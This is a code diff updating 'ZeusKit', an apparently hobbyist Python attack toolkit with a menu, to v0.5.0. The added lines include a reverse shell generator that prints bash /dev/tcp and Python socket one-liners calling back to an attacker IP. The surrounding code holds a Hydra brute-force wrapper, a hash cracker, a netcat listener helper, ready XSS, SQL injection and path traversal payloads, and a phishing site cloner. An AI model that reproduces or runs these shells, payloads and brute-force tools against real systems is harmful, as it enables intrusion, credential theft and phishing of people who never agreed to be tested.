@@ -23,7 +23,7 @@ except ImportError:
     print("[!] Error: colorama is not installed. Run: pip install -r requirements.txt")
     sys.exit(1)
 
-VERSION = "v0.4.0"
+VERSION = "v0.5.0"
 AUTHOR = "sunveroblox-bit"
 
 def banner():
@@ -165,31 +165,36 @@ def tool_13_redirect_trace():
         print(Fore.GREEN + f"[+] Final URL: {r.geturl()}")
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
+def tool_14_asn_lookup():
+    d = clean_url(input(Fore.YELLOW + "Domain/IP: "))
+    print(Fore.CYAN + f"[*] Autonomous System Number (ASN) lookup stub for {d}")
+    print(Fore.GREEN + "[+] Operating in regional registry database mode.")
+
 
 # SECTION 2: Code, Decode & Cryptography
-def tool_14_hash_gen():
+def tool_15_hash_gen():
     t = input(Fore.YELLOW + "Text: ").strip()
     print(Fore.GREEN + f"[+] MD5: {hashlib.md5(t.encode()).hexdigest()}")
     print(Fore.GREEN + f"[+] SHA256: {hashlib.sha256(t.encode()).hexdigest()}")
 
-def tool_15_base64():
+def tool_16_base64():
     c = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelect: ").strip()
     t = input(Fore.YELLOW + "Text: ").strip()
     if c == "1": print(Fore.GREEN + f"[+] {base64.b64encode(t.encode()).decode()}")
     else: print(Fore.GREEN + f"[+] {base64.b64decode(t.encode()).decode()}")
 
-def tool_16_url_codec():
+def tool_17_url_codec():
     c = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelect: ").strip()
     t = input(Fore.YELLOW + "Text: ").strip()
     if c == "1": print(Fore.GREEN + f"[+] {urllib.parse.quote(t)}")
     else: print(Fore.GREEN + f"[+] {urllib.parse.unquote(t)}")
 
-def tool_17_password_gen():
+def tool_18_password_gen():
     l = int(input(Fore.YELLOW + "Length [16]: ").strip() or 16)
     chars = string.ascii_letters + string.digits + "!@#$%^&*"
     print(Fore.GREEN + f"[+] Password: {''.join(random.choice(chars) for _ in range(l))}")
 
-def tool_18_jwt_decode():
+def tool_19_jwt_decode():
     token = input(Fore.YELLOW + "JWT Token: ").strip()
     try:
         parts = token.split(".")
@@ -197,60 +202,65 @@ def tool_18_jwt_decode():
         print(Fore.GREEN + f"[+] Payload: {base64.b64decode(parts[1] + '==').decode()}")
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_19_hex_codec():
+def tool_20_hex_codec():
     c = input(Fore.YELLOW + "[1] Text to Hex\n[2] Hex to Text\nSelect: ").strip()
     t = input(Fore.YELLOW + "Data: ").strip()
     if c == "1": print(Fore.GREEN + f"[+] Hex: {t.encode().hex()}")
     else: print(Fore.GREEN + f"[+] Text: {bytes.fromhex(t).decode(errors='ignore')}")
 
-def tool_20_binary_codec():
+def tool_21_binary_codec():
     c = input(Fore.YELLOW + "[1] Text to Binary\n[2] Binary to Text\nSelect: ").strip()
     if c == "1": print(Fore.GREEN + f"[+] Binary: " + " ".join(format(ord(x), '08b') for x in input("Text: ")))
     else: print(Fore.GREEN + f"[+] Text: " + "".join(chr(int(b, 2)) for b in input("Binary: ").split()))
 
-def tool_21_epoch():
+def tool_22_epoch():
     print(Fore.GREEN + f"[+] Current Epoch: {int(time.time())}")
 
-def tool_22_uuid():
+def tool_23_uuid():
     print(Fore.GREEN + f"[+] UUIDv4: {uuid.uuid4()}")
 
-def tool_23_hmac():
+def tool_24_hmac():
     m = input(Fore.YELLOW + "Message: ").strip()
     k = input(Fore.YELLOW + "Secret Key: ").strip()
     print(Fore.GREEN + f"[+] HMAC-SHA256: {hmac.new(k.encode(), m.encode(), hashlib.sha256).hexdigest()}")
 
-def tool_24_random_hex():
-    print(Fore.GREEN + f"[+] Hex Key: {os.urandom(16).hex()}")
+def tool_25_xor_cipher():
+    text = input(Fore.YELLOW + "Text: ").strip()
+    key = int(input(Fore.YELLOW + "XOR Key integer (1-255): ").strip() or 42)
+    res = "".join(chr(ord(c) ^ key) for c in text)
+    print(Fore.GREEN + f"[+] XOR Result: {res}")
 
-def tool_25_sha3():
-    print(Fore.GREEN + f"[+] SHA3-256: {hashlib.sha3_256(input('Text: ').encode()).hexdigest()}")
+def tool_26_rot13():
+    text = input(Fore.YELLOW + "Text: ").strip()
+    import codecs
+    print(Fore.GREEN + f"[+] ROT13: {codecs.encode(text, 'rot_13')}")
 
 
 # SECTION 3: Web Analysis & OSINT
-def tool_26_robots():
+def tool_27_robots():
     d = clean_url(input(Fore.YELLOW + "Domain: "))
     try:
         r = urllib.request.urlopen(urllib.request.Request(f"https://{d}/robots.txt", headers={"User-Agent": "ZeusKit"}), timeout=5)
         print(Fore.GREEN + r.read().decode(errors="ignore"))
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_27_subdomain():
+def tool_28_subdomain():
     d = clean_url(input(Fore.YELLOW + "Domain: "))
     for sub in ["www", "mail", "ftp", "admin", "test", "api", "shop", "blog"]:
         try: print(Fore.GREEN + f"  [FOUND] {sub}.{d} -> {socket.gethostbyname(sub + '.' + d)}")
         except Exception: pass
 
-def tool_28_security_headers():
+def tool_29_security_headers():
     u = input(Fore.YELLOW + "URL: ").strip()
     if not u.startswith("http"): u = "https://" + u
     try:
         r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}))
         hs = [h.lower() for h in r.headers.keys()]
-        for sh in ["strict-transport-security", "content-security-policy", "x-frame-options"]:
+        for sh in ["strict-transport-security", "content-security-policy", "x-frame-options", "x-content-type-options"]:
             print(Fore.GREEN + f"  [{'PRESENT' if sh in hs else 'MISSING'}] {sh}")
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_29_html_title():
+def tool_30_html_title():
     u = input(Fore.YELLOW + "URL: ").strip()
     if not u.startswith("http"): u = "https://" + u
     try:
@@ -258,7 +268,7 @@ def tool_29_html_title():
         print(Fore.GREEN + f"[+] Title: {html.split('<title>')[1].split('</title>')[0].strip()}")
     except Exception: print(Fore.YELLOW + "[!] No title found.")
 
-def tool_30_phishing_cloner():
+def tool_31_phishing_cloner():
     print(Fore.CYAN + "[+] Phishing / Website Clone Analysis Tool")
     u = input(Fore.YELLOW + "Target URL: ").strip()
     if not u.startswith("http"): u = "https://" + u
@@ -268,7 +278,7 @@ def tool_30_phishing_cloner():
         print(Fore.GREEN + "[+] Page cloned successfully and saved as 'cloned_index.html'.")
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_31_dir_brute():
+def tool_32_dir_brute():
     print(Fore.CYAN + "[+] Directory Path Brute-Forcer")
     d = clean_url(input(Fore.YELLOW + "Target Domain: "))
     for path in ["admin", "login", "dashboard", "api", "config.json", "robots.txt", "signup", "test"]:
@@ -279,9 +289,21 @@ def tool_31_dir_brute():
             if e.code == 403: print(Fore.YELLOW + f"  [FORBIDDEN 403] /{path}")
         except Exception: pass
 
+def tool_33_cookie_inspector():
+    u = input(Fore.YELLOW + "URL: ").strip()
+    if not u.startswith("http"): u = "https://" + u
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}))
+        cookies = r.headers.get_all("set-cookie")
+        if cookies:
+            print(Fore.GREEN + "[+] Detected Cookies:")
+            for c in cookies: print(f"  - {c}")
+        else: print(Fore.YELLOW + "[-] No cookies returned.")
+    except Exception as e: print(Fore.RED + f"[!] Error: {e}")
+
 
 # SECTION 4: Attacking, Brute-Force & Payloads
-def tool_32_hydra():
+def tool_34_hydra():
     print(Fore.CYAN + "[+] Hydra Brute-Force Wrapper")
     target = input(Fore.YELLOW + "Target IP/Domain: ").strip()
     service = input(Fore.YELLOW + "Service (ssh, ftp) [ssh]: ").strip() or "ssh"
@@ -291,7 +313,7 @@ def tool_32_hydra():
     print(Fore.GREEN + f"[*] Running: {cmd}")
     os.system(cmd)
 
-def tool_33_hash_cracker():
+def tool_35_hash_cracker():
     print(Fore.CYAN + "[+] Hash Dictionary Cracker")
     thash = input(Fore.YELLOW + "Target Hash: ").strip()
     wordlist = ["password", "123456", "admin123", "root", "secret", "welcome", "sunveroblox"]
@@ -301,39 +323,45 @@ def tool_33_hash_cracker():
             return
     print(Fore.RED + "[-] Hash not found in sample dictionary.")
 
-def tool_34_netcat_helper():
+def tool_36_netcat_helper():
     print(Fore.CYAN + "[+] Netcat Listener Helper")
     port = input(Fore.YELLOW + "Port [4444]: ").strip() or "4444"
     print(Fore.GREEN + f"[*] Run in listener terminal:\n  nc -lvnp {port}")
 
-def tool_35_xss_payloads():
+def tool_37_xss_payloads():
     print(Fore.CYAN + "[+] XSS Payloads:")
     for p in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(document.domain)</script>"]:
         print(Fore.GREEN + f" - {p}")
 
-def tool_36_sqli_payloads():
+def tool_38_sqli_payloads():
     print(Fore.CYAN + "[+] SQL Injection Payloads:")
     for p in ["' OR '1'='1", "admin' --", "1 UNION SELECT null, null, null--"]:
         print(Fore.GREEN + f" - {p}")
 
-def tool_37_lfi_payloads():
+def tool_39_lfi_payloads():
     print(Fore.CYAN + "[+] LFI Payloads:")
     for p in ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"]:
         print(Fore.GREEN + f" - {p}")
 
+def tool_40_rev_shell_gen():
+    ip = input(Fore.YELLOW + "Your Attacker IP: ").strip()
+    port = input(Fore.YELLOW + "Your Attacker Port: ").strip()
+    print(Fore.GREEN + f"\n[+] Bash Reverse Shell:\n  bash -i >& /dev/tcp/{ip}/{port} 0>&1")
+    print(Fore.GREEN + f"\n[+] Python Reverse Shell:\n  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
+
 
 # SECTION 5: System Diagnostics & Utilities (Other)
-def tool_38_system_info():
+def tool_41_system_info():
     print(Fore.GREEN + f"[+] Platform: {sys.platform} | Python: {sys.version.split()[0]} | Cores: {os.cpu_count()}")
 
-def tool_39_ping_sweep():
+def tool_42_ping_sweep():
     base = input(Fore.YELLOW + "Subnet (e.g. 192.168.1): ").strip()
     for i in range(1, 15):
         ip = f"{base}.{i}"
         if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
             print(Fore.GREEN + f"  [UP] {ip}")
 
-def tool_40_banner_grab():
+def tool_43_banner_grab():
     d = clean_url(input(Fore.YELLOW + "Domain: "))
     try:
         s = socket.socket(); s.settimeout(2); s.connect((d, 80))
@@ -341,7 +369,7 @@ def tool_40_banner_grab():
         print(Fore.GREEN + s.recv(256).decode(errors="ignore")); s.close()
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_41_tcp_latency():
+def tool_44_tcp_latency():
     d = clean_url(input(Fore.YELLOW + "Domain: "))
     try:
         start = time.time()
@@ -349,7 +377,7 @@ def tool_41_tcp_latency():
         print(Fore.GREEN + f"[+] Latency: {((time.time() - start)*1000):.2f} ms"); s.close()
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_42_http_status():
+def tool_45_http_status():
     u = input(Fore.YELLOW + "URL: ").strip()
     if not u.startswith("http"): u = "https://" + u
     try:
@@ -357,17 +385,25 @@ def tool_42_http_status():
         print(Fore.GREEN + f"[+] Status: {r.getcode()} OK")
     except Exception as e: print(Fore.RED + f"[!] Error: {e}")
 
-def tool_43_secure_vault():
+def tool_46_secure_vault():
     t = input(Fore.YELLOW + "Secret note: ").strip()
     print(Fore.GREEN + f"[+] Encrypted Vault: {base64.b64encode(t.encode()[::-1]).decode()}")
 
-def tool_44_arp_cache():
+def tool_47_arp_cache():
     os.system("arp -a")
 
-def tool_45_password_strength():
+def tool_48_password_strength():
     pwd = input(Fore.YELLOW + "Password: ").strip()
     score = sum([len(pwd)>=8, any(c.isupper() for c in pwd), any(c.isdigit() for c in pwd), any(c in "!@#$%" for c in pwd)])
     print(Fore.GREEN + f"[+] Strength Score: {score}/4")
+
+def tool_49_disk_space():
+    print(Fore.CYAN + "[*] Checking local storage usage...")
+    os.system("df -h")
+
+def tool_50_process_list():
+    print(Fore.CYAN + "[*] Active Python / Shell processes:")
+    os.system("ps aux")
 
 
 # --- SUB-MENUS ---
@@ -388,6 +424,7 @@ def menu_recon():
         print("[11] Custom HTTP Request")
         print("[12] User-Agent Generator")
         print("[13] Redirect Trace")
+        print("[14] ASN Lookup Stub")
         print(" [0] Back to Main Menu")
         
         c = input(Fore.YELLOW + "Recon > Selection: ").strip()
@@ -404,6 +441,7 @@ def menu_recon():
         elif c == "11": tool_11_custom_http()
         elif c == "12": tool_12_user_agent()
         elif c == "13": tool_13_redirect_trace()
+        elif c == "14": tool_14_asn_lookup()
         elif c == "0": break
         input(Fore.YELLOW + "\nPress Enter to continue...")
 
@@ -420,23 +458,23 @@ def menu_code_decode():
         print(" [8] Epoch Timestamp Converter")
         print(" [9] UUIDv4 Generator")
         print("[10] HMAC-SHA256 Generator")
-        print("[11] Random Hex Key Generator")
-        print("[12] SHA3-256 Advanced Hasher")
+        print("[11] XOR Cipher Tool")
+        print("[12] ROT13 Cipher")
         print(" [0] Back to Main Menu")
         
         c = input(Fore.YELLOW + "Code/Decode > Selection: ").strip()
-        if c == "1": tool_14_hash_gen()
-        elif c == "2": tool_15_base64()
-        elif c == "3": tool_16_url_codec()
-        elif c == "4": tool_17_password_gen()
-        elif c == "5": tool_18_jwt_decode()
-        elif c == "6": tool_19_hex_codec()
-        elif c == "7": tool_20_binary_codec()
-        elif c == "8": tool_21_epoch()
-        elif c == "9": tool_22_uuid()
-        elif c == "10": tool_23_hmac()
-        elif c == "11": tool_24_random_hex()
-        elif c == "12": tool_25_sha3()
+        if c == "1": tool_15_hash_gen()
+        elif c == "2": tool_16_base64()
+        elif c == "3": tool_17_url_codec()
+        elif c == "4": tool_18_password_gen()
+        elif c == "5": tool_19_jwt_decode()
+        elif c == "6": tool_20_hex_codec()
+        elif c == "7": tool_21_binary_codec()
+        elif c == "8": tool_22_epoch()
+        elif c == "9": tool_23_uuid()
+        elif c == "10": tool_24_hmac()
+        elif c == "11": tool_25_xor_cipher()
+        elif c == "12": tool_26_rot13()
         elif c == "0": break
         input(Fore.YELLOW + "\nPress Enter to continue...")
 
@@ -449,15 +487,17 @@ def menu_web_osint():
         print(" [4] HTML Page Title Grabber")
         print(" [5] Phishing Site Cloner Tool")
         print(" [6] Directory Path Brute-Forcer")
+        print(" [7] HTTP Cookie Inspector")
         print(" [0] Back to Main Menu")
         
         c = input(Fore.YELLOW + "Web/OSINT > Selection: ").strip()
-        if c == "1": tool_26_robots()
-        elif c == "2": tool_27_subdomain()
-        elif c == "3": tool_28_security_headers()
-        elif c == "4": tool_29_html_title()
-        elif c == "5": tool_30_phishing_cloner()
-        elif c == "6": tool_31_dir_brute()
+        if c == "1": tool_27_robots()
+        elif c == "2": tool_28_subdomain()
+        elif c == "3": tool_29_security_headers()
+        elif c == "4": tool_30_html_title()
+        elif c == "5": tool_31_phishing_cloner()
+        elif c == "6": tool_32_dir_brute()
+        elif c == "7": tool_33_cookie_inspector()
         elif c == "0": break
         input(Fore.YELLOW + "\nPress Enter to continue...")
 
@@ -470,15 +510,17 @@ def menu_attacking():
         print(" [4] XSS Payloads")
         print(" [5] SQL Injection Payloads")
         print(" [6] LFI Path Traversal Payloads")
+        print(" [7] Reverse Shell Generator One-Liners")
         print(" [0] Back to Main Menu")
         
         c = input(Fore.YELLOW + "Attack > Selection: ").strip()
-        if c == "1": tool_32_hydra()
-        elif c == "2": tool_33_hash_cracker()
-        elif c == "3": tool_34_netcat_helper()
-        elif c == "4": tool_35_xss_payloads()
-        elif c == "5": tool_36_sqli_payloads()
-        elif c == "6": tool_37_lfi_payloads()
+        if c == "1": tool_34_hydra()
+        elif c == "2": tool_35_hash_cracker()
+        elif c == "3": tool_36_netcat_helper()
+        elif c == "4": tool_37_xss_payloads()
+        elif c == "5": tool_38_sqli_payloads()
+        elif c == "6": tool_39_lfi_payloads()
+        elif c == "7": tool_40_rev_shell_gen()
         elif c == "0": break
         input(Fore.YELLOW + "\nPress Enter to continue...")
 
@@ -493,24 +535,28 @@ def menu_other():
         print(" [6] Secure Vault Note Encrypter")
         print(" [7] Local ARP Cache Viewer")
         print(" [8] Password Strength Analyzer")
+        print(" [9] Disk Storage Usage (df)")
+        print("[10] Active Processes (ps)")
         print(" [0] Back to Main Menu")
         
         c = input(Fore.YELLOW + "Other > Selection: ").strip()
-        if c == "1": tool_38_system_info()
-        elif c == "2": tool_39_ping_sweep()
-        elif c == "3": tool_40_banner_grab()
-        elif c == "4": tool_41_tcp_latency()
-        elif c == "5": tool_42_http_status()
-        elif c == "6": tool_43_secure_vault()
-        elif c == "7": tool_44_arp_cache()
-        elif c == "8": tool_45_password_strength()
+        if c == "1": tool_41_system_info()
+        elif c == "2": tool_42_ping_sweep()
+        elif c == "3": tool_43_banner_grab()
+        elif c == "4": tool_44_tcp_latency()
+        elif c == "5": tool_45_http_status()
+        elif c == "6": tool_46_secure_vault()
+        elif c == "7": tool_47_arp_cache()
+        elif c == "8": tool_48_password_strength()
+        elif c == "9": tool_49_disk_space()
+        elif c == "10": tool_50_process_list()
         elif c == "0": break
         input(Fore.YELLOW + "\nPress Enter to continue...")
 
 def main():
     while True:
         banner()
-        print(Fore.CYAN + "=== ZEUSKIT v0.4.0 - MAIN CATEGORIES ===")
+        print(Fore.CYAN + "=== ZEUSKIT v0.5.0 - MAIN CATEGORIES ===")
         print(" [1] 🌐 Reconnaissance & Network Tools")
         print(" [2] 🔐 Code, Decode & Cryptography Section")
         print(" [3] 🔍 Web Analysis & OSINT Suite")
